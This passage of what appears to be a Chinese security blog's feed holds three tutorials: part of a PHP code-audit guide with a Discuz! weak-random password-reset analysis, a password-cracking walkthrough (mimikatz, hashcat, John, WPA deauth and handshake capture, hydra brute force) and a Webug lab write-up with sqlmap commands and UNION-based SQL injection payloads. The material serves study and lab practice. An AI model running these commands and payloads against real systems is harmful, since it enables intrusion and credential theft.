class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($i).<span class="string">"\r\n"</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们在windows系统运行上面的代码得到如下字符<code>*</code> &lt; &gt; ? P p都可以打开目录下的1.php。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：文读取件操作函数</td></tr></tbody></table><h3 id="怎么进一步寻找新的字典"><a href="#怎么进一步寻找新的字典" class="headerlink" title="怎么进一步寻找新的字典"></a>怎么进一步寻找新的字典</h3><p>上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？</p><ul><li>分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典</li><li>通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式</li><li>fuzz php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分很多都可以简单的fuzz脚本可以测试出来</li><li>分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会陆续公布一些我们对php源代码的分析）</li><li>有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽视的问题</li><li>你有什么要补充的吗？ ：）</li></ul><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><table><thead><tr><th style="text-align:left"><em>DEMO</em></th></tr></thead><tbody><tr><td style="text-align:left">*DEMO – Discuz! Reset User Password 0day Vulnerability 分析</td></tr><tr><td style="text-align:left">（Exp:[<a href="http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]）" target="_blank" rel="noopener">http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]）</a>*</td></tr><tr><td style="text-align:left">PHP版本要求:php4 php5&lt;5.2.6</td></tr><tr><td style="text-align:left">系统要求: 无</td></tr><tr><td style="text-align:left">审计策略:查找mt_srand/mt_rand</td></tr></tbody></table><p>第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">heige@heige-desktop:~/dz6/upload$ grep -in 'mt_srand' -r ./ --colour -5</span><br><span class="line">./include/global.func.php-694-  $GLOBALS['rewritecompatible'] &amp;&amp; $name = rawurlencode($name);</span><br><span class="line">./include/global.func.php-695-  return '&lt;a href="tag-'.$name.'.html"'.stripslashes($extra).'&gt;';</span><br><span class="line">./include/global.func.php-696-&#125;</span><br><span class="line">./include/global.func.php-697-</span><br><span class="line">./include/global.func.php-698-function random($length, $numeric = 0) &#123;</span><br><span class="line">./include/global.func.php:699:  PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 1000000);</span><br><span class="line">./include/global.func.php-700-  if($numeric) &#123;</span><br><span class="line">./include/global.func.php-701-          $hash = sprintf('%0'.$length.'d', mt_rand(0, pow(10, $length) - 1));</span><br><span class="line">./include/global.func.php-702-  &#125; else &#123;</span><br><span class="line">./include/global.func.php-703-          $hash = '';</span><br><span class="line">./include/global.func.php-704-          $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';</span><br><span class="line">--</span><br><span class="line">./include/discuzcode.func.php-30-</span><br><span class="line">./include/discuzcode.func.php-31-if(!isset($_DCACHE['bbcodes']) | !is_array($_DCACHE['bbcodes']) | !is_array($_DCACHE['smilies'])) &#123;</span><br><span class="line">./include/discuzcode.func.php-32-       @include DISCUZ_ROOT.'./forumdata/cache/cache_bbcodes.php';</span><br><span class="line">./include/discuzcode.func.php-33-&#125;</span><br><span class="line">./include/discuzcode.func.php-34-</span><br><span class="line">./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);</span><br><span class="line">./include/discuzcode.func.php-36-</span><br><span class="line">./include/discuzcode.func.php-37-function attachtag($pid, $aid, &amp;$postlist) &#123;</span><br><span class="line">./include/discuzcode.func.php-38-       global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;</span><br><span class="line">./include/discuzcode.func.php-39-       $attach = $postlist[$pid]['attachments'][$aid];</span><br><span class="line">./include/discuzcode.func.php-40-       if($attach['attachimg']) &#123;</span><br></pre></td></tr></table></figure><p>有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP_VERSION &lt; &apos;4.2.0&apos; &amp;&amp; mt_srand((double)microtime() * 1000000);</span><br></pre></td></tr></table></figure><p>判断了版本，如果是PHP_VERSION &gt; ‘4.2.0’使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况：</p><p>1) ‘Cross Application Attacks’ 这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() <code>*</code> 1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);</span><br></pre></td></tr></table></figure><p>这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]）</p><p>2) 有的人认为如果没有mt_srand((double)microtime() <code>*</code> 1000000);这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用’Cross Application Attacks’，5.2.6&gt;php&gt;4.2.0 php本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。</p><h3 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h3><p>本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡献了不少新发现。</p><p>另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。</p><p>本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！</p><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>[1] (<a href="http://bbs.phpchina.com/attachment.php?aid=22294" target="_blank" rel="noopener">http://bbs.phpchina.com/attachment.php?aid=22294</a>)<br>[2] ([<a href="http://www.php-security.org/" target="_blank" rel="noopener">http://www.php-security.org/</a>)<br>[3] (<a href="http://bugs.php.net/bug.php?id=40114" target="_blank" rel="noopener">http://bugs.php.net/bug.php?id=40114</a>)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>密码破解系列</title>
    <link href="http://zer0yu.github.io/2017/10/28/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E7%B3%BB%E5%88%97/"/>
    <id>http://zer0yu.github.io/2017/10/28/密码破解系列/</id>
    <published>2017-10-28T11:44:04.000Z</published>
    <updated>2017-12-02T11:52:31.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文总结了有关Windows密码、Linux密码、网络设备密码、数据库密码、无线网络密码、web应用登陆密码的破解以及在线扫描服务的密码破解。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>####1.windows密码破解</p><p>获取密码（抓取HASH）：pwdump、wce、mimikatz</p><p>破解密码：hashcat、LC5、SAMInside.exe、Ophcrack、mimikatz、hashsuite</p><p>密码抓取：</p><p>环境：windows7</p><p>前提：已经获取root权限</p><p>工具：mimikatz</p><p>操作：</p><p>原理是从lsass.exe进程中直接获取密码信息进行破解，而且该破解应该并非穷举方式，而是直接根据算法进行反向计算。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/9BDC799D-7107-4E3A-86CB-E65207AB9637.png" alt="9BDC799D-7107-4E3A-86CB-E65207AB9637"></p><p>密码提取：</p><p>原因：为了进行口令破解，必须首先运行一个工具，将Windows口令从SAM文件中提取出来，做这一步工作的原因在于Windows运行过程中SAM被锁定，不能直接复制或编辑这个文件(即使有管理员权限也不行)。</p><p>环境：windows10（提取hash）、Windows7（破解hash）</p><p>工具：Pwdump7，wce（Windows Credentials Editor）</p><p>操作：</p><p>用管理员权限打开Pwdump7，从而获得Windows口令</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8B%E5%8D%888.09.05.png" alt="img"></p><p>用管理员权限打开wce，从而获得Windows的NTML HASH</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8B%E5%8D%888.10.25.png" alt="img"></p><p>还可以利用wce直接获取Windows的密码（-w参数是通过摘要式认证缓存一个明文的密码）：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/BDD60E9E-A4AA-4443-B846-B2217A7A0206.png" alt="img"></p><p>密码破解：</p><p>环境：Windows10（CPU：i5；GPU：gtx860）</p><p>工具：hashcat、hashsuite</p><p>操作：</p><p>1.使用hashcat进行密码的破解</p><p>hashcat参数简介：</p><p>-m 这个是指定破解的hash的类型，具体的类型可以在–help参数中看到。 默认是0也就是MD5，而NTLM则是1000。 </p><p>-a 指定破解的模式，默认是字典模式 </p><p>-o 输出文件，破解成功的密码存放的文件 </p><p>–remove移除破解成功的hash，当hash是从文本中读取时有用，避免自 己手工移除已经破解的hash</p><p>–username 忽略用户名，如果你的hash文件中是username:hash这种格式只 需要指定这个参数，就不需要再手工编辑了 </p><p>-r 指定规则文件，字典根据规则文件做变形，用于破解相似密码当-a指定为3 时，就是暴力破解模式，这个模式下需要自己指定mask和长度。</p><p>Hashcat-plus中以?l表示小写字母，?d表示数字，?u表示大写字母，?s表示所有可打印符号，?a代表所有可打印字符，它等于?l?u?d?s加在一起。 </p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028814.png" alt="img"></p><p>2.使用SAMInside.exe进行密码破解</p><p>环境：Windows10</p><p>1）使用管理员身份运行SAMInside.exe</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028815.png" alt="img"></p><p>2）你可以选择使用Pwdump7获取口令之后将其导入SAMInside.exe进行破解；或者使用SAMInside.exe来直接获取本地口令进行破解（本例使用第二种方式，点击三个小人的图标然后选择import local users via scheduler将本地用户的hash导出来）。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/62EA4762-1EEB-4C95-B04D-A092175F1118.png" alt="img"></p><p>3）选择用户加载字典来进行爆破，最终可以看到已经破解了口令</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/B20BF1A6-DA9E-43C2-AA15-DC90419A748F.png" alt="img"></p><p>注：由于我之前载入字典破解了本地密码所以在每次导入时均会显示已经破解了密码</p><p>3.使用hashsuite可以直接进行windows的NTML HASH的抓取与破解。但是前提依旧是在管理员权限下进行</p><p>环境：windows10</p><p>1）首先以管理员身份运行hashsuite</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028818.png" alt="img"></p><p>2）导入要破解的口令，在这里我们选择导入本地的口令（选择后软件会自动将口令进行提取）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028819.png" alt="img"></p><p>3）之后我们选择使用字典破解的方式对账户Assassin001的口令进行破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028820.png" alt="img"></p><p>####2.Linux密码破解</p><p>知识概要：</p><p>▶ head -n 2 /etc/passwd</p><p>root;x:0:0:root:/root:/usr/bin/zsh</p><p>daemon:x;1:1:daemon:/usr/sbin:/usr/sbin/nologin</p><p>以”:”分隔，共有七个字段：</p><p>1.账号名称；2.密码（Linux早期密码存放地，现在均存在/etc/shadow中）；3.UID（用户标识符）；4.GID；5.用户信息说明列；6.主文件夹；7.shell</p><p>▶ head -n 2 /etc/shadow</p><p>root:$6$XrLBeXo2$iYJYakUC6eBvRl40PnFKlemX7IjI7QkFu7f3qTZjIr.RBy3dp3YT3QWkDYxmKBmmzQO8FUXXbK72lnaz.GeSB0:17304:0:99999:7:::</p><p>daemon:*:17043:0:99999:7:::</p><p>以”:”分隔，共有九个字段：</p><p>1.账号名称；2.密码；3.最近更新密码的日期；4.密码不可被更动的天数；5.密码需要重新更改的天数；6.密码需要更改期限前的警告天数；7.密码过期后的账号宽限时间；8.账号失效日期；9.保留</p><p>密码抓取：</p><p>环境：kali linux</p><p>前提：已经获取root权限(可以使用dirtycow.c等0day进行Linux的提权操作)</p><p>工具：mimipenguin(Linux下的mimikatz)</p><p>操作：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.28.10.png" alt="img"></p><p>密码破解：</p><p>环境：kali linux</p><p>前提：已经获取root权限(可以使用dirtycow.c等0day进行Linux的提权操作)</p><p>工具：John the ripper</p><p>操作：</p><p>1.使用unshadow命令创建1个含有用户名和密码详细信息的文件</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.25.01.png" alt="img"></p><p>2.使用John来破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.29.10.png" alt="img"></p><p>####3.网络设备密码破解</p><p>环境：windows7</p><p>工具：Cain</p><p>操作：</p><p>破解Cisco中Password 7加密，密文为052C3C5F70420F1A0E</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028822.png" alt="img"></p><p>环境：kali linux</p><p>工具：John the ripper</p><p>操作：</p><p>1.将密文整理成cisco: $1$sqzM$q8vBgOd3KunqZw/D1Nq211，保存在文件中然后使用john进行破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028823.png" alt="img"></p><p>####4.数据库密码破解</p><p>环境：windows10 MSSQL数据库</p><p>工具：Cain</p><p>操作：</p><p>1.添加Hash到队列</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028825.png" alt="img"></p><p>2.开始暴力破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028826.png" alt="img"></p><p>环境：windows10  MYSQL数据库</p><p>工具：Cain</p><p>操作：</p><p>1.执行SELECT password,USER() FROM mysql.user;来获取密文</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028827.png" alt="img"></p><p>2.将MYSQL的密文导入Cain</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028828.png" alt="img"></p><p>3.使用字典攻击模式进行攻击</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028829.png" alt="img"></p><p>环境：windows10 Oracle数据库</p><p>工具：Cain</p><p>操作：</p><p>1.导入Oracle数据库账号密码</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028830.png" alt="img"></p><p>2.进行暴力破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028831.png" alt="img"></p><p>####5.无线密码破解</p><p>环境：kali linux 、WPA/WPA2 PSK加密  无线路由器  TP-LINK_4D16、Windows10（hashcat进行GPU运算）</p><p>工具：外置USB无线网卡  </p><p>操作：</p><ol><li>把网卡切换为监听模式</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng start wlan0</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028835.png" alt="img"></p><p>2.监听网络流量信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng -w file wlan0mon</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028836.png" alt="img"></p><ol start="3"><li>使用mdk3， 强制断线路由的所有链接， 此次操作是为了能让aircrack抓到wifi的握手信息 ， -c为需要强制断线的信道：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdk3 wlan0mon d -c 11</span><br></pre></td></tr></table></figure><p>过了几分钟， 可以看到， 用户重新连接上了901路由， 我们也捕获到了handshake信息， 上面airodump-ng的命令窗口顶部出现了以下信息 WPA handshake  ，此时直接ctrl＋c ，停止捕获信息</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028837.png" alt="img"></p><p>在kali的Home目录下生成了了几个文件 ，此时的file-01.cap为最重要的文件：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028838.png" alt="img"></p><p>4.把文件转换为hccapx格式， 我们打开这个网站：<a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="noopener">https://hashcat.net/cap2hccapx/</a> ， 然后选择cap文件并点击covert按钮， 并下载一个hccapx格式的文件</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028839.png" alt="img"></p><p>5.网页会返回一个hccapx的文件， 使用hashcat命令破解， 参数dict.txt为生成的字典文件 ， -m参数2500代表破解的方式为WPA/WPA2， 999.hccapx为生成的文件， 最后破解出来的密码为whitehat：</p><p>PS E:\MYSEC\hashcat-3.6.0&gt; .\hashcat64.exe -m 2500 999.hccapx dict.txt</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028840.png" alt="img"></p><p>####6.web应用破解</p><p>环境：Windows10（phpstudy搭建漏洞靶场DVWA的爆破模块）</p><p>工具：burpsuite</p><p>操作：</p><p>1.使用burpsuite抓取登录时候的数据包</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.39.49.png" alt="img"></p><p>2.将数据包发送至Intruder模块并对攻击点进行标注</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.40.02.png" alt="img"></p><p>3.载入攻击字典并进行暴力破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.40.13.png" alt="img"></p><p>4.暴力破解后效果</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.41.42.png" alt="img"></p><p>5.验证破解密码是否正确（一般观察Length和Status来判断正确的密码）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.42.07.png" alt="img"></p><p>6.如果密码不正确的页面截图</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.42.20.png" alt="img"></p><p>环境：Windows7</p><p>工具：AWVS 10.5版本</p><p>操作：</p><p>1.设置浏览器代理访问登录界面使用burpsuite抓取登录请求包</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028850.png" alt="img"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028851.png" alt="img"></p><p>2.在AWVS扫描器中的HTTP Fuzzer模块填入刚抓的登录过程的HTTP数据包</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028852.png" alt="img"></p><p>3.在Generator中可以看到很多方式,可以使用AWVS自带的生成器,也可以选择File Generator来使用自己生成的字典.还可以设定是否编码.最后在需要穷举的地方指定变量,对应的是你Generator的name属性.图中的蓝色字体部分.</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028853.png" alt="img"></p><p>4.点击start，观察响应体可以看出爆破成功密码为password</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028854.png" alt="img"></p><p>####7.在线扫描破解hydra</p><p>环境：Windows10（FileZilla Server搭建的ftp服务器）、kali linux（预装了hydra）</p><p>测试用户：test：123456</p><p>操作：</p><p>1）启动ftp服务，启动成功后可以使用我添加的测试账户登录ftp读取我电脑E盘的文件</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028855.png" alt="img"></p><p>2）使用hydra来进行爆破</p><p>命令为：</p><p>hydra -L ./user.txt -P ./pass.txt -t 20 -vV -e ns 192.168.169.1 ftp</p><p>-l LOGIN 小写，用于指定破解的用户，对特定用户破解</p><p>-L FILE 大写，用于指定用户的用户名字典</p><p>-p PASS 小写，用于指定密码破解，少用，一般是采用密码字典</p><p>-P FILE 大写，用于指定密码字典</p><p>-vV为显示详细的爆破过程</p><p>-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</p><p>最后加上目标ip以及需要进行爆破的协议即可</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028856.png" alt="img"></p><p>3）显示成功后进行登录验证，发现可以成功登录</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028857.png" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;本文总结了有关Windows密码、Linux密码、网络设备密码、数据库密码、无线网络密码、web应用登陆密码的破解以及在线扫描服务的密码破解
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Webug渗透基础教程</title>
    <link href="http://zer0yu.github.io/2017/10/24/Webug%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    <id>http://zer0yu.github.io/2017/10/24/Webug渗透基础教程/</id>
    <published>2017-10-24T08:14:18.000Z</published>
    <updated>2017-12-02T11:54:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>####普通的GET注入</p><p>解法一：使用sqlmap</p><p>1）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;</a> -b –current-db –current-user</p><p>可以看到当前的数据库名称以及用户名称</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-1.png" alt="webug1-1"></p><p>2）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;</a> -D pentesterlab –tables</p><p>可以看到pentesterlab中有那些数据表</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-2.png" alt="img"></p><p>3）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;</a> -D pentesterlab -T flag –columns</p><p>显示出该表下的所有列</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-3.png" alt="img"></p><p>4）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;</a> -D pentesterlab -T flag -C flag –dump</p><p>得到flag:204f704fbbcf6acf398ffee11989b377</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-4.png" alt="img"></p><p>解法二：手工进行注入</p><p>1）先通过order by 子句判断有几个字段。</p><p><a href="http://172.16.193.128" target="_blank" rel="noopener">http://172.16.193.128</a>/pentest/test/sqli/sqltamp.php?gid=1’ order by 1 –+</p><p>当order by 后加数字为5的时候报错因而判断有4个表</p><p>2）爆数据库</p><p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;</a> UNION SELECT 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() –+</p><p>3）爆表名</p><p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;</a> UNION SELECT 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 –+</p><p>4）爆列名</p><p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;</a> UNION SELECT 1,2,3,group_concat(id,0x5e,flag) from flag –+</p><p>参考：</p><p><a href="http://www.freebuf.com/articles/web/29942.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/29942.html</a></p><p><a href="http://www.cnblogs.com/zlgxzswjy/p/6707433.html" target="_blank" rel="noopener">http://www.cnblogs.com/zlgxzswjy/p/6707433.html</a></p><p>####从图片中你能找到什么？</p><p>1）首先从网站下载这个图片，之后你可以选择用winhex（windows平台使用）分析或者使用binwalk（linux平台）来分析，这里使用binwalk</p><p>2）先看看文件的构成，可以看到是有一个rar格式的文件在里面的</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-5.png" alt="img"></p><p>3）分离文件（当然你把文件后缀修改为rar也是可以的）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-6.png" alt="img"></p><p>4）直接看123.txt的内容是：密码是123。之后post这个密码就好</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-7.png" alt="img"></p><p>他题没有出好，咱们的思路是没有问题的。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-8.png" alt="img"></p><p>####你看到了什么？</p><p>1）题目不明确的时候就看源码，源码注释部分有扫目录的提示</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-9.png" alt="img"></p><p>2）使用工具扫描目录</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-10.png" alt="img"></p><p>其实这里存在一个小技巧，如果对方没有设置好apache的话会出现列目录的情况，这往往会泄露信息</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-11.png" alt="img"></p><p>3）看一眼诡异的test</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-12.png" alt="img"></p><p>4）然后就解答了</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-13.png" alt="img"></p><p>####告诉你了FLANG是5位数</p><p>1）分析：先看源码无提示；再考虑注册等功能发现无解；最后考虑爆破</p><p>2）爆破无验证码所以使用burpsuite（此处示例使用）或者AWVS等工具均可，若有验证码则要考虑自己编写脚本。最后可以发现爆破结果为admin：admin123</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-14.png" alt="img"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-15.png" alt="img"></p><p>3）登录发现没有flag（其实也是题目的问题，我们阅读源码即可发现）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-16.png" alt="img"></p><p>####一个优点小小的特殊的注入</p><p>1）提示头注入，所以直接使用sqlmap进行注入，首先burp抓包然后保存在sqlmap中</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-17.png" alt="img"></p><p>2）分析：头注入可能出现的几个位置：X-Forwarded-For、User-agent、Referer、Cookie。此处没有出现X-Forwarded-For所以我将其加上先进行这个点的测试。运气不错直接报错。接下来进行注入，与第一题的手工注入过程类似进行注入即可，或者使用sqlmap进行注入（注入命令为：python .\sqlmap.py -r .\test.txt -p “X-Forwarded-For”   text.txt文件的内容为你抓的包）。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-18.png" alt="img"></p><p>最后成功注入得到flag</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-19.png" alt="img"></p><p>注释：其实你手里是有源代码的，源码看下从白盒角度分析你就可以得到tips在哪儿。这里是基础代码审计不过多解释(代码审计可以借助一些工具的比如我最喜欢的cobra)。</p><p>一下是使用cobra检测的结果：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-22%20%E4%B8%8B%E5%8D%888.44.47.png" 